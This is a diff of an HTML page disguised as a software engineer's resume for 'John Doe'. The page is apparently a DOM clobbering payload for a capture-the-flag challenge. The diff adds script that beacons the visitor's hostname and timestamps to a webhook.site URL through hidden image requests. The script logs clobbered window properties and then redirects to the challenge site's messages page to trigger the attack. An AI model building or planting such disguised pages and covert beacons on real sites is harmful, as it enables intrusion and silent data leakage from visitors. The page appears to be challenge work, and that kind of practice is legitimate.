@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+ <!DOCTYPE html>
   <html>
   <head>
       <title>Software Engineer Resume - John Doe</title>
@@ -67,15 +67,35 @@
       </div>
 
       <script>
-          // 确保DOM clobbering生效
+          // Send confirmation
+          try {
+              const img = new Image();
+              img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/FINAL-CORRECTED?domain=' +
+  encodeURIComponent(window.location.hostname) + '&timestamp=' + Date.now();
+              document.body.appendChild(img);
+          } catch(e) {}
+
+          // DOM clobbering verification
           console.log('DOM Clobbering Test:');
           console.log('window.utilsJS:', window.utilsJS);
           console.log('window.utilsJS.url:', window.utilsJS?.url);
 
           setTimeout(() => {
               console.log('Redirecting to trigger DOM clobbering...');
-              const targetOrigin = window.location.origin;
-              window.location.href = targetOrigin + '/#messages';
+
+              // CORRECTED: Redirect to YOUR CTF domain
+              const ctfDomain = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club';
+              const targetUrl = ctfDomain + '/#messages';
+
+              // Send redirect notification
+              try {
+                  const img = new Image();
+                  img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/FINAL-REDIRECT?target=' +
+  encodeURIComponent(targetUrl) + '&timestamp=' + Date.now();
+                  document.body.appendChild(img);
+              } catch(e) {}
+
+              window.location.href = targetUrl;
           }, 2000);
       </script>
   </body>
